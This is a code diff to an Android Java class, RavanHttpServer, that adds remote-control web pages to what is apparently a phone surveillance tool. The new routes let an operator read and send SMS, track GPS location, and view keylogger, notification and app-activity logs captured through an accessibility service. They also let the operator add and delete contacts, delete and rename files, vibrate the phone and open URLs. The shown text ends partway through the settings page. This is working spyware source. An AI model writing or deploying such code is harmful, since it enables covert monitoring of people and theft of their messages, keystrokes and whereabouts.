@@ -1,18 +1,30 @@
 package com.security.ravan;
 
+import android.app.WallpaperManager;
+import android.content.ContentProviderOperation;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.BitmapFactory;
+import android.media.AudioManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.Manifest;
 
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 
@@ -112,6 +124,13 @@ public class RavanHttpServer extends NanoHTTPD {
             "<a href=\"/files\">Files</a>" +
             "<a href=\"/calls\">Call Logs</a>" +
             "<a href=\"/contacts\">Contacts</a>" +
+            "<a href=\"/sms\">SMS</a>" +
+            "<a href=\"/apps\">Apps</a>" +
+            "<a href=\"/location\">Location</a>" +
+            "<a href=\"/keylogger\">Keylogger</a>" +
+            "<a href=\"/notifications\">Notifications</a>" +
+            "<a href=\"/activity\">Activity</a>" +
+            "<a href=\"/settings\">Settings</a>" +
             "</div>";
 
     private static final String HTML_FOOTER = "</div>" +
@@ -139,6 +158,10 @@ public class RavanHttpServer extends NanoHTTPD {
                 return serveCallLogs(params);
             } else if (uri.equals("/contacts")) {
                 return serveContacts(params);
+            } else if (uri.equals("/contacts/add")) {
+                return serveContactAdd(params);
+            } else if (uri.equals("/contacts/delete")) {
+                return serveContactDelete(params);
             } else if (uri.equals("/camera")) {
                 return serveCameraPage();
             } else if (uri.equals("/camera/capture")) {
@@ -179,6 +202,46 @@ public class RavanHttpServer extends NanoHTTPD {
                 return updateAudioSettings(params);
             } else if (uri.equals("/audio/recordings")) {
                 return serveAudioRecordings();
+            } else if (uri.equals("/sms")) {
+                return serveSmsPage(params);
+            } else if (uri.equals("/sms/send")) {
+                return serveSendSms(params);
+            } else if (uri.equals("/apps")) {
+                return serveAppsPage(params);
+            } else if (uri.equals("/location")) {
+                return serveLocationPage(params);
+            } else if (uri.equals("/location/start")) {
+                return serveLocationStart();
+            } else if (uri.equals("/location/stop")) {
+                return serveLocationStop();
+            } else if (uri.equals("/location/status")) {
+                return serveLocationStatus();
+            } else if (uri.equals("/keylogger")) {
+                return serveKeyloggerPage(params);
+            } else if (uri.equals("/keylogger/clear")) {
+                return serveKeyloggerClear(params);
+            } else if (uri.equals("/notifications")) {
+                return serveNotificationsPage();
+            } else if (uri.equals("/notifications/clear")) {
+                return serveNotificationsClear();
+            } else if (uri.equals("/activity")) {
+                return serveActivityPage();
+            } else if (uri.equals("/activity/clear")) {
+                return serveActivityClear();
+            } else if (uri.equals("/settings")) {
+                return serveSettingsPage(params);
+            } else if (uri.equals("/settings/vibrate")) {
+                return serveVibrate(params);
+            } else if (uri.equals("/settings/wakelock")) {
+                return serveWakeLock(params);
+            } else if (uri.equals("/settings/volume")) {
+                return serveVolume(params);
+            } else if (uri.equals("/settings/openurl")) {
+                return serveOpenUrl(params);
+            } else if (uri.equals("/files/delete")) {
+                return serveFileDelete(params);
+            } else if (uri.equals("/files/rename")) {
+                return serveFileRename(params);
             } else {
                 return serve404();
             }
@@ -216,7 +279,7 @@ public class RavanHttpServer extends NanoHTTPD {
                 "</div>" +
                 "<div class=\"card\">" +
                 "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
+                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px;\">"
                 +
                 "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
                 +
@@ -247,6 +310,48 @@ public class RavanHttpServer extends NanoHTTPD {
                 +
                 "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
                 "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
+                "</a>" +
+                // SMS tile
+                "<a href=\"/sms\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(241, 196, 15, 0.2), rgba(243, 156, 18, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(241, 196, 15, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128172;</div>" +
+                "<div style=\"color: #f1c40f; font-weight: 600; font-size: 0.9rem;\">SMS</div>" +
+                "</a>" +
+                // Apps tile
+                "<a href=\"/apps\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(142, 68, 173, 0.2), rgba(155, 89, 182, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(142, 68, 173, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128187;</div>" +
+                "<div style=\"color: #8e44ad; font-weight: 600; font-size: 0.9rem;\">Apps</div>" +
+                "</a>" +
+                // Location tile
+                "<a href=\"/location\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(22, 160, 133, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(22, 160, 133, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128205;</div>" +
+                "<div style=\"color: #16a085; font-weight: 600; font-size: 0.9rem;\">Location</div>" +
+                "</a>" +
+                // Keylogger tile
+                "<a href=\"/keylogger\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(192, 57, 43, 0.2), rgba(231, 76, 60, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(192, 57, 43, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#9000;</div>" +
+                "<div style=\"color: #c0392b; font-weight: 600; font-size: 0.9rem;\">Keylogger</div>" +
+                "</a>" +
+                // Notifications tile
+                "<a href=\"/notifications\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(52, 73, 94, 0.2), rgba(44, 62, 80, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 73, 94, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128276;</div>" +
+                "<div style=\"color: #34495e; font-weight: 600; font-size: 0.9rem;\">Notif Logs</div>" +
+                "</a>" +
+                // Activity tile
+                "<a href=\"/activity\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(41, 128, 185, 0.2), rgba(52, 152, 219, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(41, 128, 185, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128200;</div>" +
+                "<div style=\"color: #2980b9; font-weight: 600; font-size: 0.9rem;\">Activity</div>" +
+                "</a>" +
+                // Settings tile
+                "<a href=\"/settings\" style=\"padding: 20px 12px; background: linear-gradient(135deg, rgba(127, 140, 141, 0.2), rgba(149, 165, 166, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(127, 140, 141, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#9881;</div>" +
+                "<div style=\"color: #7f8c8d; font-weight: 600; font-size: 0.9rem;\">Settings</div>" +
                 "</a>" +
                 "</div>" +
                 "</div>" +
@@ -1849,5 +1954,659 @@ public class RavanHttpServer extends NanoHTTPD {
         html.append(HTML_FOOTER);
 
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    // ==================== SMS ====================
+
+    private Response serveSmsPage(Map<String, String> params) {
+        String folder = params.containsKey("folder") ? params.get("folder") : "all";
+        int page = 1;
+        int limit = 50;
+        try {
+            if (params.containsKey("page"))
+                page = Integer.parseInt(params.get("page"));
+            if (page < 1)
+                page = 1;
+        } catch (Exception e) {
+            page = 1;
+        }
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128172; SMS Messages</h2>");
+
+        // Folder tabs
+        html.append("<div style=\"display: flex; gap: 10px; margin-bottom: 20px;\">");
+        String[] folders = { "all", "inbox", "sent" };
+        for (String f : folders) {
+            String active = f.equals(folder) ? "background: rgba(233, 69, 96, 0.3); border-color: #e94560;" : "";
+            html.append("<a href=\"/sms?folder=").append(f).append(
+                    "\" style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; border: 1px solid rgba(255,255,255,0.1); ")
+                    .append(active).append("\">");
+            html.append(f.substring(0, 1).toUpperCase()).append(f.substring(1));
+            html.append("</a>");
+        }
+        html.append("</div>");
+
+        // Check permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+                context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            html.append(
+                    "<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div>");
+        } else {
+            int total = SmsManager.getSmsCount(context, folder);
+            int totalPages = (int) Math.ceil((double) total / limit);
+            html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(total)
+                    .append(" messages | Page ").append(page).append(" of ").append(Math.max(1, totalPages))
+                    .append("</p>");
+
+            html.append("<div style=\"overflow-x: auto;\"><table>");
+            html.append("<thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
+            String rows = SmsManager.loadSmsHtml(context, folder, page, limit);
+            if (rows != null && !rows.isEmpty()) {
+                html.append(rows);
+            } else {
+                html.append(
+                        "<tr><td colspan='4' style='text-align:center; padding:30px; color:#888;'>No messages found</td></tr>");
+            }
+            html.append("</tbody></table></div>");
+
+            // Pagination
+            if (totalPages > 1) {
+                html.append("<div class=\"pagination\">");
+                if (page > 1)
+                    html.append("<a href=\"/sms?folder=").append(folder).append("&page=").append(page - 1)
+                            .append("\">&#8592; Prev</a>");
+                for (int i = Math.max(1, page - 2); i <= Math.min(totalPages, page + 2); i++) {
+                    html.append("<a ").append(i == page ? "class=\"active\" " : "").append("href=\"/sms?folder=")
+                            .append(folder).append("&page=").append(i).append("\">").append(i).append("</a>");
+                }
+                if (page < totalPages)
+                    html.append("<a href=\"/sms?folder=").append(folder).append("&page=").append(page + 1)
+                            .append("\">Next &#8594;</a>");
+                html.append("</div>");
+            }
+        }
+        html.append("</div>");
+
+        // Send SMS form
+        html.append("<div class=\"card\">");
+        html.append("<h3 style=\"margin-bottom: 15px;\">&#9993; Send SMS</h3>");
+        html.append("<form method=\"get\" action=\"/sms/send\">");
+        html.append("<div style=\"display: grid; gap: 12px;\">");
+        html.append(
+                "<input type=\"text\" name=\"to\" placeholder=\"Phone Number\" required style=\"padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 0.9rem; outline: none;\">");
+        html.append(
+                "<textarea name=\"message\" placeholder=\"Message\" required rows=\"3\" style=\"padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 0.9rem; outline: none; resize: vertical;\"></textarea>");
+        html.append(
+                "<button type=\"submit\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border: none; border-radius: 10px; color: #fff; cursor: pointer; font-size: 0.9rem; font-weight: 600;\">Send SMS</button>");
+        html.append("</div></form></div>");
+
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveSendSms(Map<String, String> params) {
+        String to = params.get("to");
+        String message = params.get("message");
+        String result = "Missing parameters";
+
+        if (to != null && message != null && !to.isEmpty() && !message.isEmpty()) {
+            result = SmsManager.sendSms(context, to, message);
+        }
+
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/sms\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#9993; " + escapeHtml(result) + "</h2><p>Redirecting...</p></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    // ==================== APPS ====================
+
+    private Response serveAppsPage(Map<String, String> params) {
+        String search = params.get("search");
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128187; Installed Applications</h2>");
+        html.append(AppsManager.getInstalledAppsHtml(context, search));
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    // ==================== LOCATION ====================
+
+    private Response serveLocationPage(Map<String, String> params) {
+        boolean tracking = LocationService.isCurrentlyTracking();
+        double lat = LocationService.getLastLatitude();
+        double lng = LocationService.getLastLongitude();
+        float acc = LocationService.getLastAccuracy();
+        String provider = LocationService.getLastProvider();
+        long updateTime = LocationService.getLastUpdateTime();
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; Location Tracking</h2>");
+
+        // Status
+        html.append("<div style=\"padding: 15px; background: rgba(").append(tracking ? "46,204,113" : "231,76,60")
+                .append(",0.15); border-radius: 12px; margin-bottom: 20px; border-left: 4px solid ")
+                .append(tracking ? "#2ecc71" : "#e74c3c").append(";\">");
+        html.append("<div style=\"font-weight: 600; color: ").append(tracking ? "#2ecc71" : "#e74c3c").append(";\">")
+                .append(tracking ? "&#128994; Tracking Active" : "&#128308; Tracking Stopped").append("</div>");
+        html.append("</div>");
+
+        // Control buttons
+        html.append("<div style=\"display: flex; gap: 10px; margin-bottom: 20px;\">");
+        if (!tracking) {
+            html.append(
+                    "<a href=\"/location/start\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #2ecc71, #27ae60); border-radius: 10px; color: #fff; text-decoration: none; font-weight: 600;\">&#9654; Start Tracking</a>");
+        } else {
+            html.append(
+                    "<a href=\"/location/stop\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border-radius: 10px; color: #fff; text-decoration: none; font-weight: 600;\">&#9724; Stop Tracking</a>");
+        }
+        html.append("</div>");
+
+        // Location data
+        if (lat != 0 || lng != 0) {
+            html.append("<div class=\"info-section\">");
+            html.append("<h3 style=\"margin-bottom: 15px;\">Last Known Location</h3>");
+            html.append("<div class=\"info-grid\">");
+            html.append(
+                    "<div class=\"info-item\"><span class=\"info-label\">Latitude</span><span class=\"info-value\">")
+                    .append(String.format("%.6f", lat)).append("</span></div>");
+            html.append(
+                    "<div class=\"info-item\"><span class=\"info-label\">Longitude</span><span class=\"info-value\">")
+                    .append(String.format("%.6f", lng)).append("</span></div>");
+            html.append(
+                    "<div class=\"info-item\"><span class=\"info-label\">Accuracy</span><span class=\"info-value\">")
+                    .append(String.format("%.1f m", acc)).append("</span></div>");
+            html.append(
+                    "<div class=\"info-item\"><span class=\"info-label\">Provider</span><span class=\"info-value\">")
+                    .append(provider).append("</span></div>");
+            if (updateTime > 0) {
+                html.append(
+                        "<div class=\"info-item\"><span class=\"info-label\">Last Update</span><span class=\"info-value\">")
+                        .append(new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(updateTime)))
+                        .append("</span></div>");
+            }
+            html.append("</div></div>");
+
+            // Map
+            html.append(
+                    "<div style=\"margin-top: 20px; border-radius: 15px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1);\">");
+            html.append(
+                    "<iframe width=\"100%\" height=\"400\" frameborder=\"0\" scrolling=\"no\" src=\"https://www.openstreetmap.org/export/embed.html?bbox=")
+                    .append(lng - 0.01).append(",").append(lat - 0.01).append(",").append(lng + 0.01).append(",")
+                    .append(lat + 0.01)
+                    .append("&layer=mapnik&marker=").append(lat).append(",").append(lng)
+                    .append("\" style=\"border-radius: 15px;\"></iframe>");
+            html.append("<div style=\"padding: 10px; text-align: center;\">");
+            html.append("<a href=\"https://www.google.com/maps?q=").append(lat).append(",").append(lng).append(
+                    "\" target=\"_blank\" style=\"color: #e94560; text-decoration: none;\">Open in Google Maps &#8599;</a>");
+            html.append("</div></div>");
+        } else {
+            html.append(
+                    "<div class=\"empty-state\"><div class=\"icon\">&#128205;</div><p>No location data yet. Start tracking to get location.</p></div>");
+        }
+
+        // Auto-refresh
+        if (tracking) {
+            html.append("<script>setTimeout(function(){ location.reload(); }, 10000);</script>");
+        }
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveLocationStart() {
+        LocationService.startTracking(context);
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/location\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#128205; Starting location tracking...</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveLocationStop() {
+        LocationService.stopTracking(context);
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/location\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#9724; Location tracking stopped</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveLocationStatus() {
+        String json = String.format(
+                "{\"tracking\": %s, \"latitude\": %.6f, \"longitude\": %.6f, \"accuracy\": %.1f, \"provider\": \"%s\", \"updateTime\": %d}",
+                LocationService.isCurrentlyTracking(),
+                LocationService.getLastLatitude(),
+                LocationService.getLastLongitude(),
+                LocationService.getLastAccuracy(),
+                LocationService.getLastProvider(),
+                LocationService.getLastUpdateTime());
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    // ==================== KEYLOGGER ====================
+
+    private Response serveKeyloggerPage(Map<String, String> params) {
+        boolean running = KeyloggerService.isServiceRunning();
+        String logs = KeyloggerService.getKeyLogs(context);
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#9000; Keylogger</h2>");
+
+        // Status
+        html.append("<div style=\"padding: 15px; background: rgba(").append(running ? "46,204,113" : "231,76,60")
+                .append(",0.15); border-radius: 12px; margin-bottom: 20px; border-left: 4px solid ")
+                .append(running ? "#2ecc71" : "#e74c3c").append(";\">");
+        html.append("<div style=\"font-weight: 600; color: ").append(running ? "#2ecc71" : "#e74c3c")
+                .append(";\">Accessibility Service: ").append(running ? "&#128994; Active" : "&#128308; Inactive")
+                .append("</div>");
+        if (!running) {
+            html.append(
+                    "<p style=\"color: #888; margin-top: 8px; font-size: 0.85rem;\">Enable the accessibility service in device Settings > Accessibility to activate the keylogger.</p>");
+        }
+        html.append("</div>");
+
+        // Clear button
+        html.append("<div style=\"margin-bottom: 15px;\">");
+        html.append(
+                "<a href=\"/keylogger/clear?type=keys\" style=\"padding: 10px 20px; background: rgba(231, 76, 60, 0.2); border-radius: 8px; color: #e74c3c; text-decoration: none; font-size: 0.85rem;\">&#128465; Clear Logs</a>");
+        html.append("</div>");
+
+        // Logs
+        html.append(
+                "<div style=\"background: rgba(0,0,0,0.3); border-radius: 12px; padding: 15px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; color: #2ecc71;\">");
+        html.append(escapeHtml(logs));
+        html.append("</div>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveKeyloggerClear(Map<String, String> params) {
+        String type = params.containsKey("type") ? params.get("type") : "keys";
+        KeyloggerService.clearLogs(context, type);
+        String redirect = "/keylogger";
+        if ("notifications".equals(type))
+            redirect = "/notifications";
+        if ("activity".equals(type))
+            redirect = "/activity";
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=" + redirect
+                + "\"></head><body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    // ==================== NOTIFICATIONS ====================
+
+    private Response serveNotificationsPage() {
+        boolean running = KeyloggerService.isServiceRunning();
+        String logs = KeyloggerService.getNotificationLogs(context);
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128276; Notification Logs</h2>");
+
+        html.append("<div style=\"padding: 15px; background: rgba(").append(running ? "46,204,113" : "231,76,60")
+                .append(",0.15); border-radius: 12px; margin-bottom: 20px; border-left: 4px solid ")
+                .append(running ? "#2ecc71" : "#e74c3c").append(";\">");
+        html.append("<div style=\"font-weight: 600; color: ").append(running ? "#2ecc71" : "#e74c3c")
+                .append(";\">Capture Status: ").append(running ? "&#128994; Active" : "&#128308; Inactive")
+                .append("</div>");
+        html.append("</div>");
+
+        html.append("<div style=\"margin-bottom: 15px;\">");
+        html.append(
+                "<a href=\"/keylogger/clear?type=notifications\" style=\"padding: 10px 20px; background: rgba(231, 76, 60, 0.2); border-radius: 8px; color: #e74c3c; text-decoration: none; font-size: 0.85rem;\">&#128465; Clear Logs</a>");
+        html.append("</div>");
+
+        html.append(
+                "<div style=\"background: rgba(0,0,0,0.3); border-radius: 12px; padding: 15px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; color: #f39c12;\">");
+        html.append(escapeHtml(logs));
+        html.append("</div>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveNotificationsClear() {
+        KeyloggerService.clearLogs(context, "notifications");
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/notifications\"></head><body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    // ==================== ACTIVITY MONITOR ====================
+
+    private Response serveActivityPage() {
+        boolean running = KeyloggerService.isServiceRunning();
+        String logs = KeyloggerService.getActivityLogs(context);
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128200; App Activity Monitor</h2>");
+
+        html.append("<div style=\"padding: 15px; background: rgba(").append(running ? "46,204,113" : "231,76,60")
+                .append(",0.15); border-radius: 12px; margin-bottom: 20px; border-left: 4px solid ")
+                .append(running ? "#2ecc71" : "#e74c3c").append(";\">");
+        html.append("<div style=\"font-weight: 600; color: ").append(running ? "#2ecc71" : "#e74c3c")
+                .append(";\">Monitor Status: ").append(running ? "&#128994; Active" : "&#128308; Inactive")
+                .append("</div>");
+        html.append("</div>");
+
+        html.append("<div style=\"margin-bottom: 15px;\">");
+        html.append(
+                "<a href=\"/keylogger/clear?type=activity\" style=\"padding: 10px 20px; background: rgba(231, 76, 60, 0.2); border-radius: 8px; color: #e74c3c; text-decoration: none; font-size: 0.85rem;\">&#128465; Clear Logs</a>");
+        html.append("</div>");
+
+        html.append(
+                "<div style=\"background: rgba(0,0,0,0.3); border-radius: 12px; padding: 15px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; color: #3498db;\">");
+        html.append(escapeHtml(logs));
+        html.append("</div>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveActivityClear() {
+        KeyloggerService.clearLogs(context, "activity");
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/activity\"></head><body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    // ==================== CONTACTS ADD/DELETE ====================
+
+    private Response serveContactAdd(Map<String, String> params) {
+        String name = params.get("name");
+        String number = params.get("number");
+
+        if (name != null && number != null && !name.isEmpty() && !number.isEmpty()) {
+            boolean success = ContactsManager.addContact(context, name, number);
+            String msg = success ? "Contact added successfully!" : "Failed to add contact.";
+            String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/contacts\"></head>"
+                    +
+                    "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                    +
+                    "<h2>" + escapeHtml(msg) + "</h2></body></html>";
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        }
+
+        // Show form
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#10133; Add Contact</h2>");
+        html.append("<form method=\"get\" action=\"/contacts/add\">");
+        html.append("<div style=\"display: grid; gap: 12px; max-width: 400px;\">");
+        html.append(
+                "<input type=\"text\" name=\"name\" placeholder=\"Contact Name\" required style=\"padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 0.9rem; outline: none;\">");
+        html.append(
+                "<input type=\"text\" name=\"number\" placeholder=\"Phone Number\" required style=\"padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 0.9rem; outline: none;\">");
+        html.append(
+                "<button type=\"submit\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #2ecc71, #27ae60); border: none; border-radius: 10px; color: #fff; cursor: pointer; font-size: 0.9rem; font-weight: 600;\">Add Contact</button>");
+        html.append("</div></form>");
+        html.append(
+                "<div style=\"margin-top: 15px;\"><a href=\"/contacts\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Contacts</a></div>");
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveContactDelete(Map<String, String> params) {
+        String id = params.get("id");
+        if (id != null && !id.isEmpty()) {
+            boolean success = ContactsManager.deleteContact(context, id);
+            String msg = success ? "Contact deleted!" : "Failed to delete contact.";
+            String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/contacts\"></head>"
+                    +
+                    "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                    +
+                    "<h2>" + escapeHtml(msg) + "</h2></body></html>";
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        }
+        return serve404();
+    }
+
+    // ==================== SETTINGS ====================
+
+    private Response serveSettingsPage(Map<String, String> params) {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#9881; Device Settings & Control</h2>");
+
+        // Vibrate
+        html.append(
+                "<div style=\"padding: 20px; background: rgba(255,255,255,0.03); border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.08);\">");
+        html.append("<h3 style=\"margin-bottom: 10px;\">&#128243; Vibrate Device</h3>");
+        html.append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap;\">");
+        html.append(
+                "<a href=\"/settings/vibrate?ms=500\" style=\"padding: 10px 20px; background: rgba(155,89,182,0.2); border-radius: 8px; color: #9b59b6; text-decoration: none;\">0.5s</a>");
+        html.append(
+                "<a href=\"/settings/vibrate?ms=1000\" style=\"padding: 10px 20px; background: rgba(155,89,182,0.2); border-radius: 8px; color: #9b59b6; text-decoration: none;\">1s</a>");
+        html.append(
+                "<a href=\"/settings/vibrate?ms=3000\" style=\"padding: 10px 20px; background: rgba(155,89,182,0.2); border-radius: 8px; color: #9b59b6; text-decoration: none;\">3s</a>");
+        html.append(
+                "<a href=\"/settings/vibrate?ms=5000\" style=\"padding: 10px 20px; background: rgba(155,89,182,0.2); border-radius: 8px; color: #9b59b6; text-decoration: none;\">5s</a>");
+        html.append("</div></div>");
+
+        // WakeLock
+        boolean wakeLockHeld = WakeLockHelper.isWakeLockHeld();
+        html.append(
+                "<div style=\"padding: 20px; background: rgba(255,255,255,0.03); border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.08);\">");
+        html.append("<h3 style=\"margin-bottom: 10px;\">&#128267; WakeLock</h3>");
+        html.append("<p style=\"color: #888; margin-bottom: 10px;\">Status: ")
+                .append(wakeLockHeld ? "<span style=\"color: #2ecc71;\">Active</span>"
+                        : "<span style=\"color: #e74c3c;\">Inactive</span>")
+                .append("</p>");
+        html.append("<div style=\"display: flex; gap: 10px;\">");
+        html.append(
+                "<a href=\"/settings/wakelock?action=acquire\" style=\"padding: 10px 20px; background: rgba(46,204,113,0.2); border-radius: 8px; color: #2ecc71; text-decoration: none;\">Acquire</a>");
+        html.append(
+                "<a href=\"/settings/wakelock?action=release\" style=\"padding: 10px 20px; background: rgba(231,76,60,0.2); border-radius: 8px; color: #e74c3c; text-decoration: none;\">Release</a>");
+        html.append("</div></div>");
+
+        // Volume Control
+        html.append(
+                "<div style=\"padding: 20px; background: rgba(255,255,255,0.03); border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.08);\">");
